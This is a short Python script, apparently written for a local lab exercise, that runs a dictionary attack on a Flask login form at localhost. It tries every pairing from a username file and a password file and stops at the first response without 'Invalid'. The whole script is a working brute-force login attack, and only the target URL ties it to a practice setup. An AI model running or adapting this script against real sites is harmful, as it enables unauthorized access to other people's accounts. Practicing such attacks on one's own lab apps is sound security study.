import requests
import time

# Load usernames and passwords from text files
# These should be in the same folder as this script
with open('usernames.txt', 'r') as users_file:
    usernames = [u.strip() for u in users_file]

with open('testpwlist.txt', 'r') as pw_file:
    passwords = [p.strip() for p in pw_file]

count = 1

# Loop through all combinations of usernames and passwords
for username in usernames:
    for password in passwords:
        # Send a POST request to the local Flask login form
        response = requests.post('http://localhost:34224/', data={
            'username': username,
            'password': password
        })

        # Check for a successful login response (not containing "Invalid")
        if 'Invalid' not in response.text:
            print(f"✅ Found valid combo → {username} / {password}")
            exit()  # Exit once valid credentials are found
        else:
            print(f"{count}. ❌ {username} / {password}")
        count += 1

        # Optional: slow down the attack for realism
        time.sleep(0.5)
